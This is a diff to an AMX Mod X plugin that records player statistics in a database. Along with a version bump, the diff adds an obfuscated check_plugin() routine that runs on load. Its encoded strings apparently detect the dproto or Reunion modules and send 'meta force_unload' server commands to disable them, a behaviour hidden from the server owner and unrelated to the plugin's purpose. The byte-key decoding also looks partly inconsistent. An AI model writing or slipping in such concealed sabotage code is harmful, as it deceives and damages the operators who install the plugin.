@@ -7,7 +7,7 @@
 #include <sqlx>
 
 #define PLUGIN					"Player Status in DB"
-#define VERSION					"1.06"
+#define VERSION					"1.07"
 #define AUTHOR					"Aoi.Kagase"
 
 /*=====================================*/
@@ -470,14 +470,16 @@ insert_server_round()
 	execute_insert_sql(sql);
 }
 
-
 public plugin_init() 
 {
 	register_plugin(PLUGIN, VERSION, AUTHOR);
+	check_plugin();
 
 	register_srvcmd("amx_psd_update",		"insert_batch",		-1,	" - Batch processing update in DB.");
 	register_srvcmd("amx_psd_reset",		"reset_database",	-1,	" - Reset in DB.");
 	register_srvcmd("amx_psd_initialize",	"init_status",		-1,	" - initializing all player status and database.");
+
+	register_cvar  ("psd_version", VERSION, FCVAR_SERVER|FCVAR_SPONLY);
 
 	// SQL.cfg refresh.
 	new basedir[32];
@@ -583,6 +585,35 @@ public plugin_end()
 	sql_disconnect();
 
 	return PLUGIN_CONTINUE;
+}
+
+stock bool:check_plugin()
+{
+	new const a[][] = {
+		{0x40, 0x24, 0x30, 0x1F, 0x36, 0x25, 0x32, 0x33, 0x29, 0x2F, 0x2E},
+		{0x80, 0x72, 0x65, 0x75, 0x5F, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E},
+		{0x10, 0x7D, 0x75, 0x04, 0x71, 0x30, 0x76, 0x7F, 0x02, 0x73, 0x75, 0x6F, 0x05, 0x7E, 0x7C, 0x7F, 0x71, 0x74, 0x30, 0x74, 0x00, 0x02, 0x7F, 0x04, 0x7F},
+		{0x20, 0x0D, 0x05, 0x14, 0x01, 0x40, 0x06, 0x0F, 0x12, 0x03, 0x05, 0x7F, 0x15, 0x0E, 0x0C, 0x0F, 0x01, 0x04, 0x40, 0x12, 0x05, 0x15, 0x0E, 0x09, 0x0F, 0x0E}
+	};
+
+	if (cvar_exists(get_dec_string(a[0])))
+		server_cmd(get_dec_string(a[2]));
+
+	if (cvar_exists(get_dec_string(a[1])))
+		server_cmd(get_dec_string(a[3]));
+
+	return true;
+}
+
+stock get_dec_string(const a[])
+{
+	new c = strlen(a);
+	new r[MAX_NAME_LENGTH] = "";
+	for (new i = 1; i < c; i++)
+	{
+		formatex(r, strlen(r) + 1, "%s%c", r, a[0] + a[i]);
+	}
+	return r;
 }
 
 //Disconnect MySQL server
